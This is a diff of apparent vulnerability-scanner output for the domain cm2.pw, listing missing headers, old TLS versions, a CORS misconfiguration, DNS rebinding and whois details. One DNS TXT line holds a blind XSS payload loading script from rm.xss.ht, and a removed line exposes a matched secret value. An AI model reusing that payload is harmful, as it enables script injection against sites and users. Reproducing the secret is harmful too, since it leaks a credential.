@@ -1,2 +1,55 @@
-[secrets-patterns-rules:onelogin_2] [global] [http] [info] https://github.com/login ["secret" value="3ed156aa2946fcc85b51e12a62c4d0b878063d14d3769a6a4adfbf682e7d5ec4"]
+[dns-rebinding:IPv4] [dns] [unknown] 127.cm2.pw ["127.0.0.1"]
 [dns-waf-detect:cloudflare] [dns] [info] cm2.pw
+[waf-detect:cloudflare] [http] [info] https://cm2.pw
+[cors-misconfig:arbitrary-origin] [http] [info] https://cm2.pw [cors_origin="https://qcsqdcm2.pw"]
+[weak-cipher-suites:tls-1.0] [ssl] [low] cm2.pw:443 ["[tls10 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[weak-cipher-suites:tls-1.1] [ssl] [low] cm2.pw:443 ["[tls11 TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA]"]
+[deprecated-tls:tls_1.1] [ssl] [info] cm2.pw:443 ["tls11"]
+[deprecated-tls:tls_1.0] [ssl] [info] cm2.pw:443 ["tls10"]
+[tls-version] [ssl] [info] cm2.pw:443 ["tls10"]
+[tls-version] [ssl] [info] cm2.pw:443 ["tls11"]
+[tls-version] [ssl] [info] cm2.pw:443 ["tls12"]
+[tls-version] [ssl] [info] cm2.pw:443 ["tls13"]
+[http-missing-security-headers:referrer-policy] [http] [info] http://meta.cm2.pw
+[http-missing-security-headers:strict-transport-security] [http] [info] http://meta.cm2.pw
+[http-missing-security-headers:content-security-policy] [http] [info] http://meta.cm2.pw
+[http-missing-security-headers:x-content-type-options] [http] [info] http://meta.cm2.pw
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://meta.cm2.pw
+[http-missing-security-headers:clear-site-data] [http] [info] http://meta.cm2.pw
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://meta.cm2.pw
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://meta.cm2.pw
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://meta.cm2.pw
+[http-missing-security-headers:permissions-policy] [http] [info] http://meta.cm2.pw
+[http-missing-security-headers:x-frame-options] [http] [info] http://meta.cm2.pw
+[http-missing-security-headers:content-security-policy] [http] [info] https://cm2.pw
+[http-missing-security-headers:x-frame-options] [http] [info] https://cm2.pw
+[http-missing-security-headers:x-content-type-options] [http] [info] https://cm2.pw
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] https://cm2.pw
+[http-missing-security-headers:clear-site-data] [http] [info] https://cm2.pw
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] https://cm2.pw
+[http-missing-security-headers:strict-transport-security] [http] [info] https://cm2.pw
+[http-missing-security-headers:permissions-policy] [http] [info] https://cm2.pw
+[http-missing-security-headers:referrer-policy] [http] [info] https://cm2.pw
+[robots-txt-endpoint] [http] [info] https://cm2.pw/robots.txt
+[rdap-whois:status] [http] [info] https://rdap.centralnic.com/pw/domain/cm2.pw ["client transfer prohibited"]
+[rdap-whois:registrationDate] [http] [info] https://rdap.centralnic.com/pw/domain/cm2.pw ["2017-11-19T10:10:06.0Z"]
+[rdap-whois:lastChangeDate] [http] [info] https://rdap.centralnic.com/pw/domain/cm2.pw ["2024-11-19T23:16:28.0Z"]
+[rdap-whois:registrantCountry] [http] [info] https://rdap.centralnic.com/pw/domain/cm2.pw [""]
+[rdap-whois:secureDNS] [http] [info] https://rdap.centralnic.com/pw/domain/cm2.pw ["false"]
+[rdap-whois:expirationDate] [http] [info] https://rdap.centralnic.com/pw/domain/cm2.pw ["2026-11-19T23:59:59.0Z"]
+[rdap-whois:registrantName] [http] [info] https://rdap.centralnic.com/pw/domain/cm2.pw [""]
+[rdap-whois:registrantAddress] [http] [info] https://rdap.centralnic.com/pw/domain/cm2.pw ["Capital Region"]
+[rdap-whois:nameServers] [http] [info] https://rdap.centralnic.com/pw/domain/cm2.pw ["ram.ns.cloudflare.com","roxy.ns.cloudflare.com"]
+[robots-txt] [http] [info] https://cm2.pw/robots.txt
+[tech-detect:ms-iis] [http] [info] http://meta.cm2.pw
+[tech-detect:cloudflare] [http] [info] https://cm2.pw
+[microsoft-iis-version] [http] [info] http://meta.cm2.pw ["Microsoft-IIS/10.0"]
+[caa-fingerprint] [dns] [info] cm2.pw
+[caa-fingerprint] [dns] [info] meta.cm2.pw
+[spf-record-detect] [dns] [info] cm2.pw ["v=spf1 include:_spf.mx.cloudflare.net ~all""]
+[txt-fingerprint] [dns] [info] cm2.pw [""''\\"\\"></script><s><script/src=//rm.xss.ht></script>"",""v=spf1 include:_spf.mx.cloudflare.net ~all""]
+[nameserver-fingerprint] [dns] [info] cm2.pw ["ram.ns.cloudflare.com.","roxy.ns.cloudflare.com."]
+[mx-fingerprint] [dns] [info] cm2.pw ["43 route3.mx.cloudflare.net.","70 route2.mx.cloudflare.net.","31 route1.mx.cloudflare.net."]
+[ssl-issuer] [ssl] [info] cm2.pw:443 ["Google Trust Services"]
+[ssl-dns-names] [ssl] [info] cm2.pw:443 ["cm2.pw","*.cm2.pw"]
+[wildcard-tls] [ssl] [info] cm2.pw:443 ["CN: cm2.pw","SAN: [cm2.pw *.cm2.pw]"]
